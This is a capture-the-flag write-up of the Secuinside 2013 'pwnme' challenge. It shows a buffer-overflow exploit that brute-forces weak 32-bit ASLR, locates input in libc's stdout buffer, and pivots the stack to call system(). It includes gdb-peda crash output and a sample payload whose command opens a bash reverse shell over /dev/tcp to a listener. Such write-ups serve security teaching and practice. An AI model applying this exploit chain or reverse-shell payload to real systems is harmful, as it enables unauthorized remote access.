---
title: '[Secuinside CTF 2013] pwnme writeup'
author: longld
layout: post

aktt_notify_twitter:
  - no
shorturls:
  - 'a:0:{}'
tweetbackscheck:
  - 1408358961
kopa_newsmixlight_total_view:
  - 1
category: ctf - clgt crew
tags:
  - aslr
  - CTF
  - 'CTF - CLGT Crew'
  - return-to-libc
  - rop
---
Challenge summary:

Binary : http://war.secuinside.com/files/pwnme  
Source : http://war.secuinside.com/files/pwnme.c  
===================================  
OS : Ubuntu 13.04 with PIE+ASLR+NX  
md5 of libc-2.17.so : 45be45152ad28841ddabc5c875f8e6e4

IP : 54.214.248.68  
PORT : 8181,8282,8383

This is the only exploit challenge comes with source. The bug is simple: buffer overflow with only 16-bytes at *pwnme.c:67*, just enough to control EIP. The goal is to bypass PIE+ASLR+NX. We first thought about information leak by overwriting one byte of saved EIP and looking for status. Unfortunately, this way soon becomes an dead end as socket was closed before returning at *pwnme.c:72*, so no more input, output can be provided to the program. Conclusion: we have to bruteforce for useful addresses, and due to binary is PIE bruteforcing for libc address the best way for code reuse. Luckily, ASLR on Ubuntu x86 is weak, the libc base address looks like 0xb7NNN000 with only 12-bits randomization. Server daemon will fork a child process for every coming connection, that means addresses will be the same for all instances and bruteforcing 12-bits only take 4096 tries at max. If server is fast, stable this can be done in few minutes, but in fact CTF game server was out of service for most of the time :).

Now we can assume that libc is at fixed address, let build the payload. But where is my input buffer? It was zeroing out at *pwnme.c:71*, there must be something hidden. Let take a look at crash by sending a 1040 bytes pattern buffer:

<pre class="brush: plain; title: ; notranslate" title="">Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0xb774b000 --&gt; 0x1aed9c
ECX: 0x0
EDX: 0xb774b000 --&gt; 0x1aed9c
ESI: 0x0
EDI: 0x0
EBP: 0x41397441 ('At9A')
ESP: 0xbfac6ce0 --&gt; 0x1
EIP: 0x75417375 ('usAu')
EFLAGS: 0x10217 (CARRY PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x75417375
[------------------------------------stack-------------------------------------]
0000| 0xbfac6ce0 --&gt; 0x1
0004| 0xbfac6ce4 --&gt; 0xbfac6d74 --&gt; 0xbfac78db ("./pwnme")
0008| 0xbfac6ce8 --&gt; 0xbfac6d7c --&gt; 0xbfac78e3 ("TERM=xterm")
0012| 0xbfac6cec --&gt; 0xb777a000 --&gt; 0x20f38
0016| 0xbfac6cf0 --&gt; 0x20 (' ')
0020| 0xbfac6cf4 --&gt; 0x0
0024| 0xbfac6cf8 --&gt; 0xb77566f0 --&gt; 0xb759c000 --&gt; 0x464c457f
0028| 0xbfac6cfc --&gt; 0x3
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x75417375 in ?? ()
gdb-peda$ patts
Registers contain pattern buffer:
EIP+0 found at offset: 1036
EBP+0 found at offset: 1032
No register points to pattern buffer
Pattern buffer found at:
0xb7753000 : offset 1016 - size   24 (mapped)
0xb7753023 : offset   27 - size  989 (mapped)
0xbfac6cd0 : offset 1024 - size   16 ($sp + -0x10 [-4 dwords])
References to pattern buffer found at:
0xb774ba24 : 0xb7753000 (/lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so)
0xb774ba28 : 0xb7753000 (/lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so)
0xb774ba2c : 0xb7753000 (/lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so)
0xb774ba30 : 0xb7753000 (/lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so)
0xb774ba34 : 0xb7753000 (/lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so)
0xb774ba38 : 0xb7753000 (/lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so)
0xb774ba3c : 0xb7753000 (/lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so)
0xbfac6210 : 0xb7753000 ($sp + -0xad0 [-692 dwords])
0xbfac6224 : 0xb7753000 ($sp + -0xabc [-687 dwords])
0xbfac6248 : 0xb7753000 ($sp + -0xa98 [-678 dwords])
0xbfac6254 : 0xb7753000 ($sp + -0xa8c [-675 dwords])
0xbfac6294 : 0xb7753000 ($sp + -0xa4c [-659 dwords])
0xbfac67c8 : 0xb7753000 ($sp + -0x518 [-326 dwords])
0xbfac67d4 : 0xb7753000 ($sp + -0x50c [-323 dwords])
0xbfac6814 : 0xb7753000 ($sp + -0x4cc [-307 dwords])
gdb-peda$
</pre>

Our input buffer is still there in non-stack memory starts at 0xb7753000, actually this is &#8220;stdout&#8221; buffer used in *printf()* at *pwnme.c:70*.

<pre class="brush: plain; title: ; notranslate" title="">gdb-peda$ info symbol 0xb7753000
No symbol matches 0xb7753000.
gdb-peda$ info symbol 0xb774ba24
_IO_2_1_stdout_ + 4 in section .data of /lib/i386-linux-gnu/tls/i686/nosegneg/libc.so.6
</pre>

We can only assume that libc is fixed, if above buffer address is randomized things will become worse (means finding tedious ROP gadgets to pivot). Fortunately, that buffer is at fixed offset related to libc address.

<pre class="brush: plain; title: ; notranslate" title="">gdb-peda$ vmmap libc
Start      End        Perm    Name
0xb759c000 0xb7749000 r-xp    /lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so
0xb7749000 0xb774b000 r--p    /lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so
0xb774b000 0xb774c000 rw-p    /lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so
gdb-peda$ distance 0xb759c000 0xb7753000
From 0xb759c000 to 0xb7753000: 1798144 bytes, 449536 dwords
</pre>

Try to run the program several times to check and the offset is unchanged. We can build the payload now, the simplest one is calling *system()* with bash reverse shell, or you can try harder with full ROP payload (like what we did during the contest and wasted few more hours :)).

Sample payload will look like:

<pre class="brush: plain; title: ; notranslate" title="">base = 0xb7500000 + bruteforce_value
target = base + 1798144 + 0x304 # make enough space for fake stack
cmd_ptr = target + some_offset # calculate it yourself
cmd = "bash -c 'exec &gt;/dev/tcp/127.127.127.127/4444 0&lt;&1';"
payload = [ret ... ret, system, exit, cmd_ptr, cmd, padding] # total size = 1032
payload += [target] # will become EBP
payload += [leave_ret] # stack pivoting
</pre>

Run it hundred of times and wait for a shell coming to your box.